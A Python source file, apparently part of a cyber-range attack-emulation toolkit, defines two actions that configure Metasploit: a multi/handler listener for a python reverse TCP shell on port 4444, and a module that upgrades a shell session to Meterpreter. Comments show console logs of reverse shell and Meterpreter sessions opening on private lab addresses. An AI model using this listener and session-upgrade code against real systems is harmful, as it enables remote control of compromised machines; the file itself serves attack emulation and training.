from cyst_models.cryton.actions.action import Action, ExternalResources


class SessionListener(Action):
    def __init__(self, message_id: int, caller_id: str, external_resources: ExternalResources):
        template = {
            "name": f"session-listener-{message_id}",
            "step_type": "worker/execute",
            "arguments": {
                "module": "metasploit",
                "module_arguments": {
                    "module_name": "multi/handler",
                    "datastore": {"payload": "python/shell_reverse_tcp", "LHOST": "0.0.0.0", "LPORT": 4444},
                },
            },
        }
        super().__init__(message_id, template, caller_id, external_resources)


# [*] Using configured payload generic/shell_reverse_tcp
# PAYLOAD => python/shell_reverse_tcp
# LHOST => 0.0.0.0
# LPORT => 4444
# [*] Started reverse TCP handler on 0.0.0.0:4444
# [*] Command shell session 1 opened (10.0.0.2:4444 -> 10.0.0.1:42168) at 2024-06-17 11:55:29 +0000
# [*] Command shell session 2 opened (10.0.0.2:4444 -> 10.0.0.1:60538) at 2024-06-17 11:55:29 +0000
# [*] Session 1 created in the background.
# NYJkKNkAFSKM4sq9qpyz
# [*] Command shell session 3 opened (10.0.0.2:4444 -> 10.0.0.1:37604) at 2024-06-17 11:55:29 +0000

# {'session_id': 1}


class UpgradeSession(Action):
    def __init__(
        self, message_id: int, caller_id: str, external_resources: ExternalResources, session: int, lhost: str
    ):
        template = {
            "name": f"upgrade-session-{message_id}",
            "step_type": "worker/execute",
            "arguments": {
                "module": "metasploit",
                "module_arguments": {
                    "module_name": "multi/manage/shell_to_meterpreter",
                    "datastore": {
                        "LHOST": lhost,
                        "SESSION": session,
                    },
                },
            },
        }
        super().__init__(message_id, template, caller_id, external_resources)


# [-] The following options failed to validate: Value 'None' is not valid for option 'LHOST'.
# LHOST => 10.0.0.2
# SESSION => 1
# [!] SESSION may not be compatible with this module:
# [!]  * incompatible session platform: python. This module works with: Linux, OSX, Unix, Solaris, BSD, Windows.
# [*] Upgrading session ID: 1
# [*] Starting exploit/multi/handler
# [*] Started reverse TCP handler on 10.0.0.2:4433
# [*] Sending stage (1017704 bytes) to 10.0.0.1
# [*] Meterpreter session 4 opened (10.0.0.2:4433 -> 10.0.0.1:41886) at 2024-06-17 11:55:52 +0000
# [*] Command stager progress: 100.00% (773/773 bytes)
# [*] Post module execution completed
# y6KkpAM9t5v34r49Gdzd

# {'session_id': 4}
